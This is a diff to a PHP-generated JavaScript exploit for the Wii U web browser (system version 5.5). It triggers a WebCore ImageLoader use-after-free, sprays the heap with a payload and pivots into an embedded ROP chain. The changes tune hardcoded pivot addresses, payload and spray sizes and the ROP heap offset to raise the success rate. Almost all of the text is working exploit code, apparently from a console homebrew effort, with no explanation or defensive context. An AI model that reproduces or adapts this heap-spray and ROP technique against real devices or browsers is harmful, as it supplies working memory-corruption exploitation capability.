@@ -10,13 +10,20 @@ function hexentities($str) {
 
 // Settings
 $_REQUEST['sysver'] = '550'; // Currently hardcoded.
-$payload_size = 0x8000;
-$pivotAdressAdress       = 0x1B800000; //r6
-$payload_srcaddr = 0x1D600000;
-$ROPHEAP = $payload_srcaddr + 0x800000;
-$ROPCHAIN_JS_VAR = 1;
+$generatebinrop = 1; // Make sure the $ROPCHAIN will be in binary.
 
-$USE_FIXED_PAYLOAD_LEGNTH = 0x400000; // This may be useless, but it worked once.. soo..
+$pivotAdress        = 0x010ADDCC; // don't change this.
+$payload_size       = 0x20000; // the codegen is 128kb max.
+$pivotAdressAdress  = 0x1B800000; // where does this come from? Seems to be stable with the current spraying
+
+// These values could be adjusted to increase success rate.
+$payload_srcaddr    = 0x1D500000 - 0x00A10000;
+$payload_spray_size = 0x400000;
+
+$ROPHEAP = $payload_srcaddr - 0x1000; //+ is a BAD idea as is may override our payload
+
+$ropchainselect = 1; // Put codebin on heap and search it.
+//$ropchainselect = 2; // Put codebin into ROP (Only works with reaaaaaally small payloads.
 
 /**
  Expects a wiiuhaxx_common_cfg.php with the following variables
@@ -38,20 +45,22 @@ Result: Bug is present, crash
 function UaF(a){    
     //Warning, the delta was modified !
     var delta                   = 0x0<!--#echo var="delta" -->000000; //from 0x0 to 0x04000000 step by 0x01000000
-    var pivotAdress             = 0x010ADDCC;
+    var pivotAdress             = <?php echo $pivotAdress ?>;
     //5.5.2
     {
-        var pivotAdressAdress       = 0x1B800000; //r6
-        var payloadAdress           = 0x1D600000 + delta;
+        var pivotAdressAdress       = <?php echo $pivotAdressAdress ?>; //r6
+        var payloadAdress           = <?php echo $payload_srcaddr ?> + delta;
     }
 
-    var codegenAddress          = 0x01800000;
-    var sizeWebCoreImageLoader  = 0x18;
-    var sprayCount              = 0x1900;
+    var codegenAddress          = 0x01800000; // don't change this.
+    var sizeWebCoreImageLoader  = 0x18;       // don't change this.
+    
+    var payloadsize             = <?php echo $payload_size; ?>;
+    var sprayCount              = <?php echo $payload_spray_size; ?>/payloadsize;
     var _4K                     = 0x1000;
     var _16K                    = 0x4000;
     var _32K                    = 0x8000;
-
+    
     //radio is the *ONLY* type that left the freed WebCore::ImageLoader free !
     a.type="radio";
 
@@ -78,7 +87,6 @@ function UaF(a){
     dv.setUint32(0x0C, 0x00000000);         //m_failedLoadURL
     dv.setUint32(0x10, 0x00000000);         //m_hasPendingBeforeLoadEvent
     dv.setUint32(0x14, 0x00000000);         //padding
-        
 
     <?php echo "var realROPChain = [" .  hexentities($ROPCHAIN) . "]"; ?> // creates "var realROPChain = [...];"
 
